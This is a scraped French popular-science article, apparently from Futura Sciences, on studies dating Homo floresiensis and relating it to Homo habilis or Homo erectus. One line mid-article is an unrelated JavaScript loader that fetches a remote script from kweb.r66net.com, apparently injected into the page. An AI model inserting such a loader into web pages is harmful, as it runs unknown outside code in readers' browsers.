{"title": "L'Homme de Flores, dit le Hobbit, serait bien plus ancien qu'on ne le pensait", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-04-26", "content": "Une nouvelle etude sur ces humains minuscules decouverts sur l'ile de Flores, en Indonesie, et qui y ont vecu jusqu'a il y a environ 50.000 ans, apporte un nouvel eclairage. Selon ses auteurs,  Homo floresiensis  n'est pas un cousin d' Homo erectus , et encore moins un  Homo sapiens  malade. Le petit Homme est beaucoup plus ancien que cela. Les Hommes de Flores seraient une population survivante d'une espece vieille de plus de 1,7 million d'annees. Ce qu'il faut retenir Une etude phylogenetique de fossiles d'Hommes de Flores indique une separation tres ancienne d'avec la lignee qui a mene a l'Homme moderne. L'origine de cette espece serait a rechercher vers -1,75 million d'annees au moins, probablement en Afrique. Ce petit hominide serait plus proche d' Homo habilis . Le << Hobbit >> continue d'etonner et de mobiliser de savants  Homo sapiens  qui veulent comprendre qui il etait. Pour mieux rencontrer l' Homme de Flores , on peut aller visiter le site de l'atelier d' Elizabeth Daynes , une plasticienne qui realise de superbes reconstructions d'hominides. Apres la decouverte de plusieurs  fossiles  dans une grotte de l'ile de Flores, en Indonesie, a partir de 2003, ce petit  hominide  de 1 a 1,20 m, a suscite trois hypotheses : Ces petits etres seraient des humains atteints de graves pathologies. Ils appartiendraient a une  espece  a part entiere, apparentee a  Homo erectus  (considere comme un ancetre de l'Homme moderne), qui a vecu en Afrique et en Asie entre -1,8 million d'annees et -100.000 ans et baptisee  Homo  floresiensis , voire a  Homo sapiens . Apres leur installation, ils auraient subi au fil des generations une evolution vers le  nanisme . Ce petit Hobbit serait bien une espece mais nettement plus ancienne, plus proche de  Homo habilis , autre rameau du buisson des Hominides, qui a peuple l'Afrique entre -2,5 et -1,5 millions d'annees. Les premieres datations, qui indiquaient seulement -18.000 ans, pouvaient plaider pour la premiere hypothese, tant il aurait ete peu vraisemblable qu'ait subsiste une espece ancestrale d'hominides a une epoque ou l' Homme de Neandertal  avait deja tire sa reverence et qu' Homo sapiens , seul rescape de la famille, inventait la culture magdalenienne, avec peintures, outils de  peche  et aiguilles a coudre. Mais en repoussant la presence de ces petits Hommes a 50.000 ans, les datations ulterieures ont change la donne. L'hypothese d'un  nanisme insulaire  a depuis lors garde la corde. Voir aussi : L'Homme de Flores n'etait-il qu'un cretin nain ? En 2007, Matthew Tocheri, du Museum d'histoire naturelle de Washington, avait compare trois os du poignet de l'Homme de Flores (le scaphoide, le trapezoide et le capitatum) a ceux de l'Homme moderne, de l'Homme de Neandertal, de l'australopitheque, du gorille et du chimpanze. Sa conclusion excluait l'hypothese d'un nanisme et il soulignait la ressemblance avec les os de singes. (c) Matthew Tocheri,  Science                               Le Hobbit serait pour nous un lointain cousin Une equipe de scientifiques vient de rendre ses conclusions d'une etude  phylogenetique  portant sur 133 caracteres analyses sur des restes de  cranes  et de dents de l'Homme de Flores. Selon eux, l'hypothese qui rend le mieux compte de ces observations est en fait la troisieme : les Hobbits seraient des cousins d' Homo habilis .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pas de nanisme insulaire, donc : les populations de cette ile seraient des survivants d'une espece tres ancienne, apparue il y a plus de 1,75 million d'annees, affirment-ils dans la revue  Journal of Human Evolution .  H. floresiensis  serait venu tout seul d'Afrique, suivant un courant migratoire jusque-la inconnu. Reste a savoir pourquoi aucun fossile approchant n'a ete decouvert en Afrique. Nul doute que le Hobbit a encore quelques secrets a nous reveler. Pour en savoir plus L'Homme de Flores est en fait notre cousin Article de  Jean-Luc Goudet  publie le 10 juin 2016 En 2003, sur l'ile de Flores, en Indonesie, de petits Hommes furent trouves et appeles << Hommes de Flores >>, ou << Hobbits >>. Onze ans plus tard, d'autres restes humains, ressemblants aux premiers mais plus anciens ont ete decouverts sur cette meme ile. Ils seraient en fait les ancetres des << Hobbits >>. De plus, puisque ces nouveaux fossiles evoquent Homo erectus, notre ancetre, ces petits Hommes sont... nos cousins ! Ils auraient subi le phenomene evolutif du nanisme insulaire. C'est probablement la fin des controverses autour de << l' Homme de Flores  >>, cet hominide dont plusieurs individus ont ete trouves en 2003 dans une grotte de l'ile de Flores, en Indonesie. Dates de 50.000 ans et ne mesurant qu'un petit metre, pour 25  kg , avec une petite tete, ce qui leur a valu le surnom de << Hobbit >> (d'apres les personnages imagines par l'ecrivain anglais J. R. R. Tolkien), ces humains-la intriguaient au plus haut point. Certains y voyaient des  Homo sapiens  difformes, atteints d'une  pathologie  qui restait a trouver, evoquant une  trisomie . D'autres en faisaient une espece a part,  Homo floresiensis , que l'evolution aurait conduit vers une petite taille apres l'arrivee sur cette ile, par un processus de nanisme insulaire, connu chez d'autres especes animales, quand les ressources se font plus rares. Sa position dans la famille humaine reste meconnue, avec deux hypotheses en lice : une filiation avec  Homo erectus  (un ancetre d' Homo sapiens ), avec  Homo habilis  ou encore avec des  australopitheques , peut-etre deja de petites tailles. Deux etudes, parues dans  Nature , viennent eclairer l'histoire d'un jour nouveau. En 2014, des restes ont ete trouves dans une autre grotte de la meme ile, sur le site de Mata Menge : un morceau de  mandibule  et six dents. Une recolte modeste mais bouleversante. La mandibule s'apparente a celle de l'Homme de Flores mais avec une taille encore plus petite que celle des fossiles de la grotte de Liang Bua (celle de la decouverte de 2003). D'apres les auteurs, il s'agit bien d'un individu adulte. Elle s'apparenterait davantage, ajoutent-ils, a  H. erectus  qu'a  H. habilis . De plus, les dents semblent intermediaires entre celles de  H. erectus  et celles de l'Homme de Flores de la grotte de Liang Bua. Nous partagerions donc un meme ancetre ( H. erectus ) avec l'Homme de Flores, qui devient un cousin. Le fragment de mandibule (a gauche) et trois des six dents (a droite), ici vus sous differents angles, ont ete retrouves dans la grotte de Mata Menge, a une centaine de kilometres de Liang Bua, ou a ete decouvert l'Homme de Flores. Ces restes s'apparentent aux fossiles de ce dernier mais aussi a ceux d' Homo erectus . Ils font du petit << Hobbit >> une espece a part entiere et tres ancienne. (c) Gerrit D. van den Berg  et al.                               Les humains peuvent rapetisser autant que les elephants... Voila pour la premiere etude. La seconde est une datation, par la methode des  isotopes  de l' argon  (evaluant le rapport  40 Ar/ 39 Ar). Le resultat est lui aussi etonnant : 700.000 ans.  Exit , donc la parente directe avec  H. sapiens  puisque  notre espece  n'existait pas encore. L'hypothese qui est ainsi consolidee est celle d'une filiation avec  H. erectus  et un phenomene de nanisme insulaire, qui a par exemple, soulignent les auteurs, abouti a des elephants mesurant 1 m au garrot, sur des iles de Mediterranee, et a des  mammouths nains , retrouves en Crete. Parvenu sur ces iles indonesiennes, ce descendant de  H. erectus , confronte a des ressources alimentaires plus rares, se serait adapte au fil des generations par une taille plus faible. Les outils les plus anciens retrouves sur l'ile indiquent, selon Gerrit van den Bergh, coauteur des deux etudes, que  H. erectus  a du arriver il y a environ un million d'annees. La conclusion en rejoint deux autres. Celle de  Matthew Tocheri , du Museum d'histoire naturelle de Washington, qui, en 2007, sur la base de comparaisons anatomiques, situait a au moins 800.000 ans la separation entre notre propre lignee et celle ayant conduit a l'Homme de Flores. Et celle de  Karen Baab , en 2013, rapprochant le Hobbit avec  H. erectus . En quelques centaines de milliers d'annees, l'espece a pu augmenter sa population en reduisant sa taille, comme les elephants de Sicile ou de Malte... Interview 1/5 : la naissance de l'Homme                       Exercice difficile, determiner l'origine de l'Homme impose de definir ce qui fait l'identite humaine. L'Homme est-il Homme par sa capacite a marcher ? a parler ? a fabriquer des outils ? Futura-Sciences a pose la question a Silvana Condemi, paleoanthropologue. Decouvrez sa reponse en video.                                       ", "theme": "planete"}